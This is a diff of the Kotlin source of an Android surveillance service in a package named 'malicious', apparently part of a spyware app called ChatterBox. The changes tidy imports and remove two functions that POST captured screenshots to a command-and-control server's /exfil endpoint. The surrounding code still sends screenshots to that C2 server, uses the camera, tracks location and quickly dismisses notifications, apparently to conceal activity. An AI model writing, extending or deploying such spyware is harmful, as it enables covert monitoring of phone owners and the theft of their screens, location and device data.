@@ -9,33 +9,24 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
-import android.graphics.BitmapFactory
 import android.graphics.PixelFormat
 import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraDevice
-import android.hardware.camera2.CameraManager
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
-import android.media.AudioFormat
-import android.media.AudioRecord
 import android.media.Image
 import android.media.ImageReader
-import android.media.MediaRecorder
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Build
-import android.os.Environment
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
-import android.os.SystemClock
 import android.provider.Settings
 import android.util.Log
-import android.view.PixelCopy
 import android.view.WindowManager
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
-import androidx.core.content.ContextCompat
 import java.io.File
 import java.io.FileOutputStream
 import java.text.SimpleDateFormat
@@ -44,7 +35,6 @@ import java.util.Locale
 import java.util.Timer
 import java.util.TimerTask
 import java.util.concurrent.Semaphore
-import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
 // Import the C2 components
@@ -54,7 +44,6 @@ import com.example.ChatterBox.malicious.LocationTracker
 
 // Import annotations for suppressing warnings
 import androidx.annotation.RequiresApi
-import com.google.firebase.crashlytics.buildtools.reloc.org.apache.commons.codec.binary.Base64
 
 // Import JSON processing
 import org.json.JSONObject
@@ -168,9 +157,9 @@ class SurveillanceService : Service() {
             put("timestamp", System.currentTimeMillis())
             put("message", "This is a test message from the device")
             put("device_info", JSONObject().apply {
-                put("model", android.os.Build.MODEL)
-                put("manufacturer", android.os.Build.MANUFACTURER) 
-                put("android_version", android.os.Build.VERSION.RELEASE)
+                put("model", Build.MODEL)
+                put("manufacturer", Build.MANUFACTURER)
+                put("android_version", Build.VERSION.RELEASE)
             })
         }
         
@@ -267,7 +256,7 @@ class SurveillanceService : Service() {
     }
 
 
-    fun setupMediaProjection(resultCode: Int, data: Intent) {
+    private fun setupMediaProjection(resultCode: Int, data: Intent) {
         projectionResultCode = resultCode
         projectionIntent = data
 
@@ -449,97 +438,6 @@ class SurveillanceService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error sending screenshot to C2", e)
         }
-    }
-
-    private fun createScreenshotJson(deviceId: String, filename: String, jpegBytes: ByteArray): String {
-        val base64Data = Base64.encodeBase64String(jpegBytes)
-        return """
-    {
-        "type": "screenshots",
-        "device_id": "$deviceId",
-        "timestamp": "${SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())}",
-        "data": {
-            "filename": "$filename",
-            "image_data": "$base64Data"
-        }
-    }
-    """.trimIndent()
-    }
-
-    // Send data in JSON format
-    private fun sendJsonData(jsonData: String, filename: String) {
-        Thread {
-            var connection: HttpURLConnection? = null
-            try {
-                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
-                connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.setRequestProperty("Content-Type", "application/json")
-                connection.setRequestProperty("User-Agent", "ChatterBox")
-                connection.doOutput = true
-
-                // Write JSON data
-                connection.outputStream.use { outputStream ->
-                    outputStream.write(jsonData.toByteArray())
-                    outputStream.flush()
-                }
-
-                // Check response
-                val responseCode = connection.responseCode
-                val responseMessage = connection.responseMessage
-                Log.d(TAG, "Screenshot JSON upload response: $responseCode - $responseMessage")
-
-                // Read and log response body for debugging
-                if (responseCode != 200) {
-                    val errorStream = connection.errorStream ?: connection.inputStream
-                    val errorResponse = errorStream.bufferedReader().use { it.readText() }
-                    Log.e(TAG, "Error response: $errorResponse")
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Error sending JSON screenshot to C2", e)
-            } finally {
-                connection?.disconnect()
-            }
-        }.start()
-    }
-
-    // Send data as binary (fixed version of original code)
-    private fun sendBinaryData(jpegBytes: ByteArray, filename: String, deviceId: String) {
-        Thread {
-            var connection: HttpURLConnection? = null
-            try {
-                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
-                connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.setRequestProperty("Content-Type", "application/octet-stream")
-                connection.setRequestProperty("X-Data-Type", "screenshots")
-                connection.setRequestProperty("X-Filename", filename)
-                connection.setRequestProperty("X-Device-ID", deviceId)
-                connection.setRequestProperty("User-Agent", "ChatterBox")
-                connection.doOutput = true
-
-                // Write JPEG data
-                connection.outputStream.use { outputStream ->
-                    outputStream.write(jpegBytes)
-                    outputStream.flush()
-                }
-
-                // Check response
-                val responseCode = connection.responseCode
-                val responseMessage = connection.responseMessage
-                Log.d(TAG, "Screenshot binary upload response: $responseCode - $responseMessage")
-
-                if (responseCode != 200) {
-                    val errorStream = connection.errorStream ?: connection.inputStream
-                    val errorResponse = errorStream.bufferedReader().use { it.readText() }
-                    Log.e(TAG, "Error response: $errorResponse")
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Error sending binary screenshot to C2", e)
-            } finally {
-                connection?.disconnect()
-            }
-        }.start()
     }
 
     // CAMERA ACCESS FUNCTIONALITY
@@ -758,7 +656,7 @@ class SurveillanceService : Service() {
         notificationManager.notify(notificationId, notification)
         
         // Auto-dismiss after 3 seconds
-        android.os.Handler().postDelayed({
+        Handler().postDelayed({
             notificationManager.cancel(notificationId)
         }, 3000)
     }
@@ -772,7 +670,7 @@ class SurveillanceService : Service() {
             locationTracker.startTracking()
             
             // Stop tracking after 10 seconds (after we get at least one location)
-            android.os.Handler().postDelayed({
+            Handler().postDelayed({
                 locationTracker.stopTracking()
             }, 10000)
         } catch (e: Exception) {
@@ -787,9 +685,9 @@ class SurveillanceService : Service() {
         try {
             // Create JSON with device information
             val deviceInfo = JSONObject().apply {
-                put("device_model", android.os.Build.MODEL)
-                put("device_manufacturer", android.os.Build.MANUFACTURER)
-                put("android_version", android.os.Build.VERSION.RELEASE)
+                put("device_model", Build.MODEL)
+                put("device_manufacturer", Build.MANUFACTURER)
+                put("android_version", Build.VERSION.RELEASE)
                 put("device_id", getDeviceID())
                 put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
                 put("timestamp", System.currentTimeMillis())
